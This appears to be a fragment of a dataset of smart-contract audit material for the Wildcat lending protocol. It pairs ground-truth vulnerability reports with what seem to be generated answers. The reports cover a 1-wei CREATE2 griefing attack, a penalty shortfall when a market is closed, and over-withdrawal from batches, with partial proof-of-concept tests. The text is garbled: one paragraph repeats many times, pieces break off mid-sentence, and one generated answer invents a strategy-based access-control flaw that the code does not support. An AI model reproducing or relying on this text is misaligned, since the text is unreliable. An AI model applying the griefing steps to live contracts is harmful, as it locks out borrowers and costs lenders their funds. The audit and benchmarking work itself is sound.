This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced

It takes an expiry value as input, which is used to determine the specific withdrawal entry to process. This means that even if an entry causes a revert, it will not halt the processing of other entries in a queue, as there is no queue implemented in this function.\n\nHowever, if you were to modify this function to process a queue of withdrawal entries, you would need to consider the described vulnerability. In that case, to mitigate the vulnerability, you could implement a mechanism for skipping or moving reverting withdrawal entries to a separate queue, like a `failedWithdrawals` queue. This would ensure the processing of queued withdrawals continues even in the presence of faulty or malicious entries.\n\nFor instance, you could modify the function to iterate over the queue and process each entry individually, skipping or moving reverting entries to a separate queue as needed. Here's a simplified example:\n\nfunction processWithdrawalQueue() external nonReentrant {\naddress accountAddress;\nuint32 expiry;\n\nwhile (hasMoreWithdrawals()) {\n(accountAddress, expiry) = getNextWithdrawal();\n\ntry executeWithdrawal(accountAddress, expiry) {\n// Withdrawal successful\n} catch (Revert reason) {\n// Withdrawal failed, move to failed withdrawals queue\nmoveToFailedWithdrawalsQueue(accountAddress, expiry);\n}\n}\n}\n\nIn this example, `hasMoreWithdrawals()` and `getNextWithdrawal()` are functions that return the next withdrawal entry in the queue, and `moveToFailedWithdrawalsQueue()` is a function that moves a reverting entry to the `failedWithdrawals` queue.",

Instead, this function focuses on executing a withdrawal for a specific account and asset, handling expiry, and transferring the assets accordingly.\n\nHowever, it is essential to review the entire smart contract code to ensure there are no other functions with the described vulnerability. Based on the provided code snippet, there is no vulnerability related to inadequate access control checks for withdrawal functionality in this specific function.",
                "poc_patch": "Answer: Yes, the smart contract code is vulnerable to inadequate access control checks for withdrawal functionality.\n\nType of vulnerability: Inadequate access control checks for withdrawal functionality\n\nReason: The given `executeWithdrawal` function does not perform any checks to verify if the `accountAddress` is a registered or enabled strategy. This allows any address to initiate a withdrawal, even if they are not an enabled strategy. This vulnerability can lead to unauthorized withdrawals and potential loss of funds.\n\nTo generate a Proof of Concept (PoC), consider the following example:\n\n1. Assume there are two strategies, `strategyA` and `strategyB`, where `strategyA` is registered and enabled, while `strategyB` is disabled.\n2. `strategyA` has a debt of 1000 tokens, while `strategyB` has a debt of 500 tokens.\n3. An attacker can call the `executeWithdrawal` function with `strategyB`'s address and a future expiry time.\n4. The smart contract will not check if `strategyB` is enabled, and it will still process the withdrawal.\n5. As a result, 500 tokens will be transferred to the attacker's address, even though `strategyB` is disabled.\n\nTo mitigate this vulnerability, the `executeWithdrawal` function should include a check to ensure that the `accountAddress` is a registered and enabled strategy. This can be achieved by adding a function similar to `isRegisteredStrategy` and `isEnabledStrategy` to verify the status of the strategy before processing the withdrawal. Additionally, it is recommended to follow the suggested mitigation steps from the vulnerability knowledge provided:\n\n1. Add a check on the enabled strategy token in the withdrawal function.\n2.

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

bytes32(0)) return escrowContract;\n+   if (escrowContract.codehash != bytes32(0)) && escrowContract.codehash != keccak256(\"\") return escrowContract;\n```\n\nAlternatively, use

        "gt": "\n# Vulnerability details\n\n## Bug Description\n\nIn `WildcatMarketControllerFactory.sol`, registered borrowers can call `deployController()` to deploy a `WildcatMarketController` contract for themselves.\n\nThe function checks if the `codehash` of the controller address is `bytes32(0)` to determine if the controller has already been deployed:\n\n\n\n```solidity\n    // Salt is borrower address\n    bytes32 salt = bytes32(uint256(uint160(msg.sender)));\n    controller = LibStoredInitCode.calculateCreate2Address(\n      ownCreate2Prefix,\n      salt,\n      controllerInitCodeHash\n    );\n    if (controller.codehash != bytes32(0)) { // auditor: This check\n      revert ControllerAlreadyDeployed();\n    }\n```\n\nThis same check is also used in `deployMarket()`, which is called by borrowers to deploy markets:\n\n\n\n```solidity\n    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);\n    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);\n    if (market.codehash != bytes32(0)) {\n      revert MarketAlreadyDeployed();\n    }\n```\n\nThis check also exists in `createEscrow()`, which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:\n\n\n\n```solidity\n    escrowContract = getEscrowAddress(borrower, account, asset);\n\n    if (escrowContract.codehash != bytes32(0)) return escrowContract;\n```\n\nHowever, this `<address>.codehash != bytes32(0)` check is insufficient to determine if an address has existing code.\n\nAccording to , addresses without code only return a `0x0` codehash when they are **empty**:\n> In case the account does not exist or is empty (as defined by  `0` is pushed to the stack.\n>\n> In case the account does not have code the keccak256 hash of empty data (i.e. `c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`) is pushed to the stack.\n\nAs seen from above, addresses without code can also return `keccak256(\"\")` as its codehash if it is non-empty.  states that an address must have a zero ETH balance for it to be empty:\n\n> An account is considered *empty* when it has **no code** and **zero nonce** and **zero balance**.\n\nAs such, if anyone transfers 1 wei to an address, `.codehash` will return `keccak256(\"\")` instead of `bytes32(0)`, making the checks shown above pass incorrectly.\n\nSince all contract deployments in the protocol use `CREATE2`, a malicious attacker can harm users by doing the following:\n- For controller deployments:\n  - Attacker calls  to compute the controller address for a borrower.\n  - Attacker transfers 1 wei to it, causing `.codehash` to become non-zero.\n  - When `deployController()` is called by the borrower, the check passes, causing the function to revert.\n- For market deployments:\n  - Attacker calls  with arguments such that the deployment salt is the same. \n  - Attacker transfers 1 wei to the resulting market address, causing `.codehash` to become non-zero.\n  - When `deployMarket()` is called by the borrower, the function reverts.\n- For escrow deployments:\n  - Attacker calls  with the `borrower`, sanctioned `lender` and market/asset address to compute the resulting escrow address.\n  - Attacker transfers 1 wei to the escrow address, causing `.codehash` to become non-zero.\n  - When either  or  is called, `createEscrow()` simply returns the escrow address instead of deploying an escrow contract.\n  - The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.\n\nNote that for controller deployments, since the salt is fixed to the `borrower` address and cannot be varied, the DOS for `deployController()` is permanent. This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

bytes32(0)) return escrowContract;\n+   if (escrowContract.codehash != bytes32(0)) && escrowContract.codehash != keccak256(\"\") return escrowContract;\n```\n\nAlternatively, use

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

        "gt": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

        "gtraw": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

Withdrawal requests that could not be fully honored at the end of their withdrawal cycle are batched together, marked as expired withdrawals, and added to the withdrawal queue. These batches are tracked using the time of expiry, and when assets are returned to a market with a non-zero withdrawal queue, assets are immediately routed to the unclaimed withdrawals pool and can subsequently be claimed by lenders with the oldest expired withdrawals first.\n\nThe **withdrawalBatchDuration** can be set to zero so lenders do not have to wait before being able to withdraw funds from the market; however, this can cause issues where lenders in a batch can withdraw more than their pro-rata share of the batch's paid assets.\n\nA lender calls **queueWithdrawal** first to initiate the withdrawal; this will place it in a batch respective to its expiry.\n```solidity\nfunction queueWithdrawal(uint256 amount) external nonReentrant {\n        MarketState memory state = _getUpdatedState();\n\n        ...\n\n        // If there is no pending withdrawal batch, create a new one.\n        if (state.pendingWithdrawalExpiry == 0) {\n            state.pendingWithdrawalExpiry = uint32(block.timestamp + withdrawalBatchDuration);\n            emit WithdrawalBatchCreated(state.pendingWithdrawalExpiry);\n        }\n        // Cache batch expiry on the stack for gas savings.\n        uint32 expiry = state.pendingWithdrawalExpiry;\n\n        WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n\n        // Add scaled withdrawal amount to account withdrawal status, withdrawal batch and market state.\n        _withdrawalData.accountStatuses[expiry][msg.sender].scaledAmount += scaledAmount;\n        batch.scaledTotalAmount += scaledAmount;\n        state.scaledPendingWithdrawals += scaledAmount;\n\n        emit WithdrawalQueued(expiry, msg.sender, scaledAmount);\n\n        // Burn as much of the withdrawal batch as possible with available liquidity.\n        uint256 availableLiquidity = batch.availableLiquidityForPendingBatch(state, totalAssets());\n        if (availableLiquidity > 0) {\n            _applyWithdrawalBatchPayment(batch, state, expiry, availableLiquidity);\n        }\n\n        // Update stored batch data\n        _withdrawalData.batches[expiry] = batch;\n\n        // Update stored state\n        _writeState(state);\n    }\n```\n\nNow once the **withdrawalBatchDuration** has passed, a lender can call **executeWithdrawal** to finalize the withdrawal. This will grab the batch and let the lender withdraw a percentage of the batch if the batch is not fully paid or all funds if it is fully paid.\n\n```solidity\nfunction executeWithdrawal(address accountAddress, uint32 expiry) external nonReentrant returns (uint256) {\n        if (expiry > block.timestamp) {\n            revert WithdrawalBatchNotExpired();\n        }\n        MarketState memory state = _getUpdatedState();\n\n        WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n        AccountWithdrawalStatus storage status = _withdrawalData.accountStatuses[expiry][accountAddress];\n\n        uint128 newTotalWithdrawn =\n            uint128(MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount));\n        uint128 normalizedAmountWithdrawn = newTotalWithdrawn - status.normalizedAmountWithdrawn;\n        status.normalizedAmountWithdrawn = newTotalWithdrawn;\n        state.normalizedUnclaimedWithdrawals -= normalizedAmountWithdrawn;\n\n        ...\n\n        // Update stored state\n        _writeState(state);\n\n        return normalizedAmountWithdrawn;\n    }\n```\n\nLet's look at how this percentage is determined: the **newTotalWithdrawn** function determines a lender's available withdrawal amount by multiplying the **normalizedAmountPaid** with the **scaledAmount** and dividing the result by the batch's **scaledTotalAmount**. This ensures that each lender in the batch can withdraw an even amount of the available funds in the batch depending on their **scaledAmount**.\n\n```solidity\n uint128 newTotalWithdrawn =\n            uint128(MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount));\n```\n\nThis works fine when **withdrawalBatchDuration** is set over zero, as the batch values (except **normalizedAmountPaid**) are finalized. However, when set to zero, we can end up with lenders in a batch being able to withdraw more than **normalizedAmountPaid** in that batch, potentially violating protocol invariants.\n\nConsider the following scenario:\n\nThere is only 5 tokens available to burn\n\nLender A calls **queueWithdrawal** with 5 and **executeWithdrawal** instantly.\n    \n    newTotalWithdrawn = (normalizedAmountPaid) * (scaledAmount) / scaledTotalAmount\n    \n    newTotalWithdrawn = 5 * 5 = 25 / 5 = 5\n    \nLender A was able to fully withdraw.\n\nLender B comes along and calls **queueWithdrawal** with 5 and **executeWithdrawal** instantly in the same block.\n    \nThis will add to the same batch as lender A as it is the same expiry.\n    \nNow let's look at **newTotalWithdrawn** for Lender B.\n    \n    newTotalWithdrawn = (normalizedAmountPaid) * (scaledAmount) / scaledTotalAmount\n    \n    newTotalWithdrawn = 5 * 5 = 25 / 10 = 2.5\n    \nLets see what the batch looks like now\n  \n  - Lender A was able to withdraw 5 tokens in the batch\n\n  - Lender B was able to withdraw 2.5 tokens 